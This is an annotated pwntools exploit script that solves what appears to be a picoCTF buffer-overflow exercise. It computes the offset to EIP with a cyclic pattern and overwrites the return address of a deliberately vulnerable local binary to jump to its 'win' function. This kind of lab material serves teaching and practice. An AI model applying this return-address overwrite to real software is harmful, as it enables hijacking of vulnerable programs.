from pwn import *
import os

# =============================================================================
# PHASE 1: SETUP & CONFIGURATION
# =============================================================================

# Load the target binary. 
# ELF() parses the binary's metadata, giving us access to:
# 1. Symbol table (functions like 'win', 'main')
# 2. Architecture info (32-bit vs 64-bit, Endianness)
exe = './vulnerable-programs/picoctf-bof1/vuln'
elf = ELF(exe)

# Set the global pwntools context.
# This ensures all subsequent packing (p32/p64) and shellcode generation 
# automatically matches the binary's architecture (i386-32-little).
context.binary = elf
context.log_level = 'info'

def get_offset():
    """
    PHASE 2: RECONNAISSANCE (Dynamic Analysis)
    
    Calculates exactly how many bytes of 'garbage' we need to send 
    before we overwrite the Instruction Pointer (EIP).
    """
    log.info("--- STARTING OFFSET CALCULATION ---")
    
    # 1. Start a throw-away instance of the process
    io = process(exe)
    
    # 2. Generate a "De Bruijn Sequence" (Cyclic Pattern)
    # This creates a string like 'aaaabaaacaaa...' where every 4-byte 
    # subsequence is unique. If the program crashes, the specific 4 bytes 
    # inside EIP will tell us exactly where the overflow happened.
    pattern = cyclic(128)
    io.sendline(pattern)
    
    # 3. Wait for the crash (Segfault) to generate a core dump file
    io.wait()
    
    # 4. Analyze the Core Dump
    # The core dump is a snapshot of memory at the moment of the crash.
    # We load it to see what value ended up in the EIP register.
    # Note: If this fails, run `ulimit -c unlimited` in your terminal.
    core = io.corefile
    
    # 5. Calculate the Offset
    # cyclic_find() searches our original pattern for the 4 bytes found in EIP.
    # It returns the exact index (distance) from the start of the buffer.
    crash_eip = core.eip
    offset = cyclic_find(crash_eip)
    
    log.success(f"Crash detected at EIP: {hex(crash_eip)}")
    log.success(f"Offset calculated: {offset} bytes")
    
    # Cleanup: Remove the core dump file to keep the directory clean
    if os.path.exists(core.file.name):
        os.remove(core.file.name)
        
    return offset

# =============================================================================
# PHASE 3: WEAPONIZATION (Exploit)
# =============================================================================

# Step 1: Dynamically determine the stack offset
offset = get_offset()

# Step 2: Start the real target process
log.info("--- LAUNCHING ATTACK ---")
p = process(exe)

# Step 3: Construct the Malicious Payload
# flat() allows us to build the byte-stream abstractly:
#   - It pads the start with random bytes up to 'offset' length.
#   - It appends the address of 'win' immediately after.
#   - It handles Endianness (Little Endian) automatically via context.binary.
payload = flat({
    offset: elf.symbols['win']
})

# Step 4: Injection
# We send the payload. The 'gets()' function in the binary will read past
# the buffer, fill the stack with our padding, and overwrite the 
# Return Address with the address of 'win'.
log.info(f"Targeting 'win' function at: {hex(elf.symbols['win'])}")
p.sendline(payload)

# Step 5: Interaction
# When 'vuln' returns, it jumps to 'win'. We switch to interactive mode
# to see the output (the flag or success message).
p.interactive()